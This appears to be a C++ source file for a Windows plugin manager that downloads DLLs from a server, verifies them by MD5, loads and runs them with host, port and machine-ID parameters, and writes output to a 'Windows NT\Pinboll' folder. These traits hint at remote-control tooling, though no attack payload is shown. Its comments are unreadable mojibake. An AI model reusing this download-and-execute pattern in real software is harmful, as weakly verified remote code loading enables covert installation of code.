/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief �����Ϣ���ʵ���ļ�
* @author ����ΰ chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note 
*************************************************************************/

//#include "../StdAfx.h"
#include "ddc_util.h"
#include "ddc_dlopen.h"
#include "ddc_filesystem.h"
#include "PluginInfo.h"
#include "UpdateManager.h"
#include "Log.h"
#include "MD5.h"

//���������������
PLUGPARAMIMP *ParseCapArg(PLUGPARAMIMP *cap,CPluginInfo *info)
{
	DDC_POINTNULL_RETURN(cap,NULL);
	DDC_POINTNULL_RETURN(info,NULL);

	cap->dwMember1 = cap->dwMember2 = 0;

	const char *szDelim = ",";
	char *p = strtok(info->m_szReserved,szDelim);
	if( !p )
	{
		// ���Ϸ�
		LOG((LEVEL_WARNNING,"����������Ϸ�:%s\n",info->m_szReserved));
		cap->dwMember2 = 0;
	}

	for( int i=0;i<10;++i )
	{
		if( !p )
			break;

		if( atoi(p) == 1 )
			DDC_SET_BITS( cap->dwMember2,1<<i);
			

		p = strtok(NULL,szDelim);
	}

	cap->dwMember1 = info->m_dwReserved;
	return cap;
}


// ����
CPluginInfo::CPluginInfo()
	:m_pfnStart(NULL),m_pfnStop(NULL),m_dwSize(-1),m_status(STATUS_INIT),m_dwFlag(0)
{
	m_md5[0] = 0;
	m_ver[0] = 0;
}

// ����
CPluginInfo::~CPluginInfo()
{
	UnLoadPlug(0);
}

// ���ز��
int CPluginInfo::LoadPlug( DWORD dwFlag )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::LoadPlug(%d) \n",dwFlag));
	if( !nm_ddc::exists(m_strFullName.c_str()) )
	{
		m_status = STATUS_DELETE;
		return DDCE_MODULE_ERROR;
	}

	// ��ǰ״̬
	DDC_BOOL_RETURN( m_status==STATUS_LOAD,0);

	// ���������Ҳ����ֹͣ�����У���ֹ���δ���ӷ�����״̬��ͣ�ص���
	DDC_BOOL_RETURN( m_status==STATUS_RUNNING,0);

	// ����״̬
	DDC_BOOL_RETURN( m_status==STATUS_INIT,DDCE_STATUS_ERROR);
	DDC_BOOL_RETURN( m_status==STATUS_ERROR,DDCE_STATUS_ERROR);
	DDC_BOOL_RETURN( m_status==STATUS_WAITDOWNLOAD,DDCE_STATUS_ERROR);
	
	
	m_hnd = LoadLibrary(m_strFullName.c_str());
	if( !m_hnd )
	{
		LOG((LEVEL_ERROR,"LoadLibrary(%s) failed.\n",m_strFullName.c_str()));
		return DDCE_MODULE_ERROR;
	}

	m_pfnStart = (FN_START)GetProcAddress(m_hnd,DLL_START_SYM);
	m_pfnStop = (FN_STOP)GetProcAddress(m_hnd,DLL_STOP_SYM);
	if( !m_pfnStart || !m_pfnStop )
	{
		LOG((LEVEL_ERROR,"symbol(%s) failed.\n",DLL_START_SYM));
		return DDCE_MODULE_ERROR;
	}
	/*
	
	// LoadLibrary
	CVirusDllHandle *handle = CVirusDllManager::instance()->open_dll(m_strFullName.c_str(),0,0 );
	if( !handle )
	{
		LOG((LEVEL_ERROR,"LoadLibrary(%s) failed.\n",m_strFullName.c_str()));
		return DDCE_MODULE_ERROR;
	}
	
	// ȡ��������ָ��
	m_pfnStart = (FN_START)handle->symbol(DLL_START_SYM);
	if( !m_pfnStart )
	{
		LOG((LEVEL_ERROR,"symbol(%s) failed.\n",DLL_START_SYM));
		return DDCE_MODULE_ERROR;
	}

	m_pfnStop = (FN_STOP)handle->symbol(DLL_STOP_SYM);
	if( !m_pfnStop )
	{
		LOG((LEVEL_ERROR,"symbol(%s) failed.\n",DLL_STOP_SYM));
		return DDCE_MODULE_ERROR;
	}
	*/
	
	//��״̬
	m_status = STATUS_LOAD;
	return 0;
}

// ж�ز������ɾ����
int CPluginInfo::UnLoadPlug( DWORD dwFlag )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::UnLoadPlug(%d),%s,m_status=%u\n",dwFlag,m_strRealName.c_str(),m_status));
	DDC_BOOL_RETURN( m_status==STATUS_UNLOAD,0);


	// ��������У���ֹͣ
	if( m_status == STATUS_RUNNING )
		StopPlug(0);

	// ж��
	if( m_status == STATUS_LOAD )
	{
		FreeLibrary(m_hnd);
		
		/*
		int ret = CVirusDllManager::instance()->close_dll(m_strFullName.c_str() );
		if( ret != 0 )
			LOG((LEVEL_ERROR,"Unload(%s) failed.return %d(%x)",m_strFullName.c_str(),ret,ret));	
		*/
		//��״̬
		m_status = STATUS_UNLOAD;
	}
	else
		NULL;			//�������ж�һ��״̬����������ʱж�ػ�������Ӧ�ã�����״̬Ҫ��
	
	m_pfnStart = NULL;
	m_pfnStop = NULL;

	return 0;
}

// �������
int CPluginInfo::StartPlug( PLUGPARAM *param )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::StartPlug %s %s\n",m_strRealName.c_str(),param->imp.chResultPath));	
	DDC_POINTNULL_RETURN(param,DDCE_ARGUMENT_NULL);

	// ��ǰ״̬
	DDC_BOOL_RETURN( m_status==STATUS_RUNNING,0);



	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::StartPlug::LoadPlugǰ %s %s,m_status = %u\n",m_strRealName.c_str(),param->imp.chResultPath,m_status));

	// �ȼ���
	if( m_status == STATUS_UNLOAD )
		LoadPlug(0);

	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::StartPlug::LoadPlug�� %s %s,m_status = %u\n",m_strRealName.c_str(),param->imp.chResultPath,m_status));


	// ����start()����
	if( m_status == STATUS_LOAD )
	{
		int ret = 0;

		// TO DO:
		// �����װ��������ͳһ�Ĺ���
		// ����������⴦��
		if( m_pid == TSP_PLUGIN_CAP_PID )
		{		
			//CaptureParam param;
			if( ParseCapArg(&param->imp,this) == 0 )
			{
				LOG((LEVEL_WARNNING,"�����������ʧ��,����%d\n",ret));
				ret = -1;		// ���������ж�ʧ��
			}			
		}
		
		if( param->imp.chResultPath[0] == 0 )   //�����ò��������·��ʧ�ܣ�����Ĭ��·��
		{
			LOG((LEVEL_WARNNING,"%s %d %s\n",param->imp.szHost,param->imp.wPort,param->imp.chResultPath));
			
			char szDefaultPath[260];

			SHGetSpecialFolderPathA(NULL,szDefaultPath,CSIDL_PROGRAM_FILES ,FALSE);

			strncat(szDefaultPath,"\\Windows NT\\Pinboll\\",MAX_PATH-15);


			strncpy(param->imp.chResultPath,szDefaultPath,260);
		}
		if( ret==0 && m_pfnStart )
			ret = (*m_pfnStart)(param->dwMachineID,&param->imp);
		
		// С��0ʧ��
		if( ret < 0 )
		{
			LOG((LEVEL_WARNNING,"���в��ʧ��,����%d\n",ret));
		}
		else
			m_status = STATUS_RUNNING;
		return 0;
	}

	
	return DDCE_STATUS_ERROR;
}

// ֹͣ���
int CPluginInfo::StopPlug( DWORD dwFlag )
{	
	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::StopPlug %s \n",m_strRealName.c_str()));
	// ��ǰ״̬
	DDC_BOOL_RETURN( m_status==STATUS_LOAD,0);

	// ����stop
	if( m_status == STATUS_RUNNING )
	{
		if( m_pfnStop )
			(*m_pfnStop)();
		m_status = STATUS_LOAD;
	}
	else
	{
		LOG((LEVEL_WARNNING,"���״̬����ȷ.%d\n",m_status));		
	}

	return 0;
}

// ���ز��
int CPluginInfo::DownloadPlug( std::string strPluginDownLoadPath )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::DownloadPlug:%s \n",m_strName.c_str() ));
	int ret = 0;

	// ״̬Ϊ�ȴ����صĲ���
	if( m_status == STATUS_WAITDOWNLOAD )
	{
		std::string strName(strPluginDownLoadPath);
		strName += m_strName;
		ret = CUpdateManager::GetFileFromServerImp(m_strURL.c_str(),strName.c_str(),m_dwSize );
		if( ret != 0 )
		{
			LOG((LEVEL_WARNNING,"GetFileFromServ error,return:%d\n",ret));
			
		}

		// ����md5
		char md5[TSP_PLUGIN_SHORT_PATH];
		memset(&md5,0,TSP_PLUGIN_SHORT_PATH);
		if( !MD5_Caculate_File ( const_cast<char *>(strName.c_str()),md5) )
		{
			LOG((LEVEL_ERROR,"����md5(%s)ʧ��\n",strName.c_str()));
			ret = DDCE_CALL_FAIL;
		}

		if( strncmp(md5,m_md5,32) != 0 )
		{
			LOG((LEVEL_ERROR,"����md5(%s)ʧ��\n",strName.c_str()));
			ret = DDCE_NOT_MATCH;
		}

		// ��״̬
		if(ret)
			m_status = CPluginInfo::STATUS_ERROR;
		else
			m_status = CPluginInfo::STATUS_DOWNLOAD;
	}

	return ret;
}

// ��ʼ��
void CPluginInfo::reset(void)
{
	m_pfnStart = 0;
	m_pfnStop = 0;

	m_strName = "";
	m_strFullName = "";
	m_md5[0] = 0;
	m_ver[0] = 0;
	m_strURL = "";
	m_dwSize = 0;
	m_dwFlag = 0;
	m_pid = 0;
	m_status = STATUS_INIT;
	m_hnd = NULL;
}

// ��ֵ
CPluginInfo& CPluginInfo::operator=(const CPluginInfo &other)
{
	m_pfnStart = other.m_pfnStart;
	m_pfnStop = other.m_pfnStop;
	m_strName = other.m_strName;
	m_strFullName = other.m_strFullName;
	memcpy(m_md5,other.m_md5,TSP_PLUGIN_SHORT_PATH);
	memcpy(m_ver,other.m_ver,TSP_PLUGIN_SHORT_PATH);
	m_strURL = other.m_strURL;
	m_dwSize = other.m_dwSize;
	m_dwFlag = other.m_dwFlag;
	m_status = other.m_status;
	m_hnd = other.m_hnd;
	m_pid = other.m_pid;
	m_strRoot = other.m_strRoot;
	m_strDir = other.m_strDir;
	m_strRealName = other.m_strRealName;

	return *this;
}

// ���ж��
int CPluginInfo::RemovePlug( DWORD dwFlag)
{
	LOG((LEVEL_FUNC_IN_OUT,"CPluginInfo::RemovePlug(%d)\n",dwFlag));
	DDC_BOOL_RETURN( m_status == STATUS_DELETE,0);

	// ��ж��
	int ret = UnLoadPlug(dwFlag);
	
	// ɾ�����
	if( !DeleteFile(m_strFullName.c_str()) )
	{
		LOG((LEVEL_ERROR,"ɾ�����ʧ��(%s):%d \n",m_strFullName.c_str(),GetLastError()));
		MoveFileEx(m_strFullName.c_str(),NULL,MOVEFILE_DELAY_UNTIL_REBOOT);

		m_status = STATUS_DELETE;	
	}
	
	m_status = STATUS_DELETE;	

	return 0;
}